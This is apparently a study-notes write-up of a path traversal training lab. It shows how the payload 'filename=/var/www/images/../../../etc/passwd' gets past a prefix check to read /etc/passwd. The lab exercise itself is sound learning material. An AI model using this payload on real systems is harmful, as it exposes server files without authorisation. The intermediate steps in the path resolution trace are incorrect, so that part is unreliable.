- **Lab objective** and difficulty level  
    
- **Step-by-step exploitation methodology**  
    
- **Payloads that worked** (and ones that didn't)  
    
- **Request/response samples** (screenshots or raw text)  
    
- **Why** the vulnerability existed and how to fix it

# **Lab objective** and difficulty level

```
 This lab contains a path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the /etc/passwd file. 
```

# **Step-by-step exploitation methodology**

```
Intercept the request of the website and keep forwading till you see this and send request to repeater
```

![Pasted image 20260619210052](../../../../Images/Pasted%20image%2020260619210052.png)

```
Enter the payload and now we have successfully solved the lab
```

![Pasted image 20260619210352](../../../../Images/Pasted%20image%2020260619210352.png)

## How this exploit works

### Example

The application receives:

```
filename=/var/www/images/cat.jpg
```

This passes validation because it starts with:

```
/var/www/images
```

and resolves to:

```
/var/www/images/cat.jpg
```

---

### The Bypass

An attacker supplies:

```
filename=/var/www/images/../../../etc/passwd
```

The validation sees:

```
/var/www/images/...
```

and thinks:

> "Looks good, it starts with `/var/www/images`."

So it allows the request.

---

### What the Operating System Does

When the OS resolves the path:

```
/var/www/images/../../../etc/passwd
```

it processes the `../` sequences:

```
/var/www/images/../../../etc/passwd↓/var/www/../etc/passwd↓/var/etc/passwd↓/etc/passwd
```

The final file accessed is:

```
/etc/passwd
```

not a file inside the images directory.